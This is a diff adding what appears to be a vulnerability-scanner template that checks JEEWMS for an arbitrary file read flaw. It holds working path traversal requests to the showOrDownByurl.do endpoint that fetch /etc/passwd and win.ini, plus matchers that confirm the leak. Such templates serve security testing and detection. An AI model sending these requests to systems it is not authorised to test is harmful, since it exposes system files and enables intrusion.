@@ -1,0 +1,21 @@
+id: poc-yaml-jeewms-arbitrary-file-read
+info:
+  name: JEEWMS Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd"
+      - "{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini"
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'root:') && contains(body, '/bin')"
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, '[files]') && contains(body, '[fonts]')"
